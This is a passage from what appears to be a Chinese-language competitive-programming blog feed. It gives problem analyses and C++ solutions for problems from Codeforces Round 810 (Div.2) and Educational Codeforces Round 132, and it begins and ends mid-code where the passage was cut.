class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">&#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Party"><a href="#B-Party" class="headerlink" title="B. Party"></a>B. Party</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题目比较有意思，出的也挺好的感觉，虽然一开始可能题意有点没读懂。有n个人，m对关系，如果每个人如果没来就会产生 $a_i$ 的不开心度，如果来了一对朋友那这对朋友要消耗一个蛋糕，一次只能生产偶数个蛋糕不能浪费。那么很显然，如果关系本身就是偶数对，那么所有人都可以来。如果关系是奇数对，我就得考虑踢人了，踢掉一个人的情况，使奇数对变成偶数对的方式就是，这个人有奇数对关系，那么踢了这个人就少了奇数对关系，结果变成偶数对了。踢掉两个人的情况，如果所有人的关系数都是奇数对或者本身踢掉两个人比踢掉一个人产生不开心指数更多，我就要考虑后面的情况了。那么我如果要踢掉两个人，那么这两个人一定都有偶数对关系，因为但凡有一个奇数对关系我都可以只踢掉那个人而保留下来另一个，显然这样的作法比较优。那么踢掉的两个人都是偶数对关系怎么办呢？如果它们自己产生了一对关系，那么两个人的偶数关系发生一个关系的重合，总体下来就是奇数对关系了。那么我们就需要踢掉两个朋友关系的，开心指数较小的两个人。</p><p>然后min一下即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> v;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;G[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.v&lt;b.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].v);</span><br><span class="line">a[i].i=i;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(G[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line"><span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">table[a[i].i]=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">G[table[x]].<span class="built_in">push_back</span>(table[y]);</span><br><span class="line">G[table[y]].<span class="built_in">push_back</span>(table[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">m=<span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="comment">//printf(&quot;i=%d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//printf(&quot;%d has %d\n&quot;,a[i].i,G[i].size());</span></span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>)&#123;</span><br><span class="line">m=a[i].v;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v&gt;m)<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> x=G[i].<span class="built_in">begin</span>();x!=G[i].<span class="built_in">end</span>();x++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v+a[*x].v&lt;m)&#123;</span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;G[*x].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">m=a[i].v+a[*x].v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Color-the-Picture"><a href="#C-Color-the-Picture" class="headerlink" title="C. Color the Picture"></a>C. Color the Picture</h2><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题也还挺好的，就是刷格子，然后要求一每个格子响铃格子都至少有三块相同色块，那么就是说你最多只有一个不同色块的相邻，并且告诉你了怎么处理边界的色块。那么它下面展示的图其实还是比较生动的，就是刷两列或者两行，然后再刷两列两列，如此往复。当然，三列四列都可以，一列是不行的，因为左右就有两个不同颜色的色块了。</p><p>那么我们直接每行每列看看能不能放的出对应的行或者列数即可。但是这里需要特判，如果我们都只能放两列，但是却只有奇数列，这种情况是不行的！！</p><p>最后不开 <code>long long</code> 见祖宗，万事给我加上一句<code>#define int long long</code>。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],c[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="comment">//int cmp(int a,int b)&#123;</span></span><br><span class="line"><span class="comment">//return a&lt;b;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">b[i]=a[i]/n;</span><br><span class="line">c[i]=a[i]/m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag1=<span class="number">0</span>,flag2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b[i]!=<span class="number">2</span>)flag1=<span class="number">1</span>;</span><br><span class="line">ans+=b[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=m)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag1&amp;&amp;m%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(c[i]!=<span class="number">2</span>)flag2=<span class="number">1</span>;</span><br><span class="line">ans+=c[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;%d %d\n&quot;,ans,n);</span></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=n)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag2&amp;&amp;n%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后说一句吧，就是细节问题真的要考虑周全一点的，小上一波分，但是离1600还是差远了，只能继续努力了，期待下次上大分了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这场打回来一点吧，只是看隔壁div1好像被喷烂了的样子，咱也不懂，也没资格打div1，很多细节没注意到送出去罚时就很难受，本场录屏在B站了，&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Codeforces Round 132(Div.2)分析</title>
    <link href="http://example.com/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/"/>
    <id>http://example.com/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/</id>
    <published>2022-07-23T13:00:00.000Z</published>
    <updated>2022-07-23T13:17:33.437Z</updated>
    
    <content type="html"><![CDATA[<p>这次的比赛没打，但是自己打估计就是自闭上去的。</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你三个门，每个门后可能有🔑，一个钥匙开一个对应的门，问你是否有办法把所有的门打开。很简单，就那到🔑开个门，换新钥匙，看看能开几个门就可以了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;a,&amp;b[<span class="number">1</span>],&amp;b[<span class="number">2</span>],&amp;b[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">int</span> key=a,cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(key)&#123;</span><br><span class="line">        key=b[key];</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Also-Try-Minecraft"><a href="#B-Also-Try-Minecraft" class="headerlink" title="B. Also Try Minecraft"></a>B. Also Try Minecraft</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目说的还是比较清楚的，把minecraft抽象成一个二维世界，只有x和y轴，y轴向下位移会受到摔落伤害，但是上升不会。现在需要执行任务，告诉你每一列的高度，每个任务需要你从一列位移到另一列，问你完成每个任务需要受到多少摔落伤害。</p><p>这题也还可以，很难不想到用前缀和的思路去做。但是因为上升不会扣血或者加血，而它又有可能从后面位移到前面，因此我们需要算出两个前缀和，然后相减即可求得每个人物需要的血量，然后不要忘了开long long。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">int</span> sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum1[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        sum1[i]=sum1[i<span class="number">-1</span>]+<span class="built_in">max</span>(a[i]-a[i+<span class="number">1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum1[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">    sum2[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;<span class="number">1</span>;i--)&#123;</span><br><span class="line">        sum2[i]+=sum2[i+<span class="number">1</span>]+<span class="built_in">max</span>(a[i]-a[i<span class="number">-1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum2[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i]); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> l,r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum1[r<span class="number">-1</span>]-sum1[l<span class="number">-1</span>]);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="comment">//l==8 r==7</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum2[r+<span class="number">1</span>]-sum2[l+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Recover-an-RBS"><a href="#C-Recover-an-RBS" class="headerlink" title="C. Recover an RBS"></a>C. Recover an RBS</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题就是摁贪，从前往后扫一遍计数，当所需的右括号刚好等于问号数量的时候，那就把前面的全部清零，重新计数，看看最后问号数量是否等于左括号的数量即可。那你可能会有疑问，什么时候问号变成左括号呢？问得好，因此我们多出一个，让问号的数量</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span 